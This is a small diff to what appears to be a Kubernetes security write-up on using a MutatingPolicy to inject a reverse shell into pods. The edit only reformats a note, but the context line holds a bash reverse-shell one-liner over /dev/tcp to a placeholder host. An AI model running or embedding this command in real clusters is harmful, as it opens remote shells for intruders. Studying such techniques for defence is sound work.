@@ -111,7 +111,8 @@ EOF
 
 To embed a reverse shell, if the base image is BusyBox-based, you can use the method above. If it has Bash available, you can use `sh -i >& /dev/tcp/x.x.x.x/<port> 0>&1`.
 
-> **Note:** This is not limited to Pods. You can also use Deployments, DaemonSets, or CronJobs, but you need to adjust the policy according to their respective specifications.
+> [!NOTE]
+> This is not limited to Pods. You can also use Deployments, DaemonSets, or CronJobs, but you need to adjust the policy according to their respective specifications.
 
 ## RBAC for MutatingPolicy
 
